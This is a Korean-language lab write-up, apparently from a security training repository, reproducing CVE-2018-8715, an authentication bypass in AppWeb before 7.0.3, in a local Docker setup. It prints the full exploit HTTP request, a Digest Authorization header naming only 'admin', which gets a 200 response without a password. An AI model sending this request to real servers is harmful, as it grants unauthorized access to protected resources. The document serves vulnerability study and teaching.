# AppWeb Authentication Bypass vulnerability (CVE-2018-8715)

 > 화이트햇 스쿨 3기 - 이서현([@seohyun09](https://github.com/seohyun09))

<br />

### 요약

  - AppWeb은 다음 세 가지 인증 방식을 지원한다.

    - Basic 인증 : 전통적인 HTTP Basic 인증 방식
   
    - Digest 인증 : 기본 인증을 개선한 방식으로, Authroization 헤더 대신 쿠키를 사용
   
    - From 인증 : HTML 기반 폼을 통한 인증
   
  - 그러나 AppWeb 7.0.3 이전 버전에는 `authCondition` 함수의 논리적 결함이 존재하여, 위조된 HTTP 요청을 통해 from 및 diget 로그인 유형에 대한 인증을 우회할 수 있는 취약점이 존재한다.

<br />

### 환경 구성 및 실행

  - `docker compose up -d`를 실행 후, `http://localhost:8080`에 접속한다.

  - 사용자 이름과 비밀번호를 입력해야 하는 창이 뜬다.
    
     <img width="500" src="https://github.com/seohyun09/kr-vulhub/blob/main/AppWeb/CVE-2018-8715/1.png">

  - 사용자 이름은 `admin`, 인증(비밀번호)을 위해서 다음과 같은 요청을 통해 우회할 수 있다.
    
    ```
    GET / HTTP/1.1
    Host: example.com
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Authorization: Digest username=admin
    
    ```
    
  - Postman을 이용하여 Exploit 헤더로 요청을 보낸다.

    - Exploit을 수행하지 않은 경우 (401 Unauthorized 에러 발생)
      
      <img width="500" src="https://github.com/seohyun09/kr-vulhub/blob/main/AppWeb/CVE-2018-8715/2.png">


    - Exploit을 수행하여 인증을 우회한 경우 (200 OK 응답)

      <img width="500" src="https://github.com/seohyun09/kr-vulhub/blob/main/AppWeb/CVE-2018-8715/3.png">

<br />

### 결론

AppWeb 7.0.3 이전 버전은 인증 로직의 취약점으로, 정상적인 인증 없이 리소스에 접근할 수 있다. 따라서, 인증 및 권한을 부여하는 로직을 설계할 때는 모든 입력과 과정을 철저하게 검증하고, 예상치 못한 우회 경로를 차단하는 것이 중요하다.

<br />

### 참고 

> [CVE-2018-8715](https://github.com/vulhub/vulhub/tree/master/appweb/CVE-2018-8715)
